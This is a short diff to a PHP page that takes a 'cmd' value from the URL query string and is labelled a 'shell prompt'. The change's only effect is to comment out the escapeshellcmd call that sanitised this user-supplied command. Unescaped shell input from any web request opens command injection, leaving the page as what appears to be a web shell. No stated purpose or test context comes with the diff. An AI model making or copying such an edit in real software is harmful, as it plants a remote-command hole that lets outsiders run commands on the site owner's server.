@@ -1,6 +1,6 @@
 <?php
   $cmd=isset($_GET['cmd']) ? $_GET['cmd'] : 'python test.py a b c d';
-  $cmd=escapeshellcmd($cmd);
+  //$cmd=escapeshellcmd($cmd);
 ?>
 
 <!--shell prompt-->
